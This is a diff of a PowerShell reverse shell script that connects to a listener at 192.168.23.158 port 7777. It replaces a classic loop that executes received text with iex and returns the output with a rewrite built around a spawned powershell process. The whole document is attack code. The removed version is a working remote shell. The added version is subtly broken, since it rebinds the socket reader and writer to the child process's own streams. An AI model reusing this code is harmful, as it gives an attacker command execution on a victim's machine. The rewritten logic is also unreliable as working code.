@@ -1,28 +1,44 @@
-# Define TCP client and establish connection
-$client = New-Object System.Net.Sockets.TCPClient("192.168.23.158", 7777)
+# Replace the IP address and port below with your listener's IP and port
+$ip = "192.168.23.158"
+$port = 7777
+
+# Create TCP client
+$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
+
+# Create stream
 $stream = $client.GetStream()
 
-# Initialize byte array to store incoming data
-[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
+# Create reader and writer objects
+$reader = New-Object System.IO.StreamReader($stream)
+$writer = New-Object System.IO.StreamWriter($stream)
 
-# Continuously read data from the network stream
-while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-    # Convert received bytes to string
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-    
-    # Execute received data as PowerShell command and capture output
-    $sendback = (iex $data 2>&1 | Out-String)
-    
-    # Format output with PowerShell prompt
-    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
-    
-    # Convert output string to bytes
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-    
-    # Send output back to TCP client
-    $stream.Write($sendbyte, 0, $sendbyte.Length)
-    $stream.Flush()
+# Create a process object for PowerShell
+$p = New-Object System.Diagnostics.Process
+$p.StartInfo.FileName = "powershell"
+$p.StartInfo.RedirectStandardInput = $true
+$p.StartInfo.RedirectStandardOutput = $true
+$p.StartInfo.UseShellExecute = $false
+$p.Start()
+
+# Create a StreamWriter to write to the process's standard input
+$p.StandardInput.AutoFlush = $true
+$writer = $p.StandardInput
+
+# Create a StreamReader to read from the process's standard output
+$reader = $p.StandardOutput
+
+# Infinite loop to continuously read commands from the listener and execute them
+while ($true) {
+    $command = $reader.ReadLine()
+    if ($command -eq $null) {
+        break
+    }
+
+    # Execute the command and send the output back to the listener
+    $output = Invoke-Expression $command
+    $writer.WriteLine($output)
 }
 
-# Close TCP client connection
+# Close the TCP client and stream
 $client.Close()
+$stream.Close()
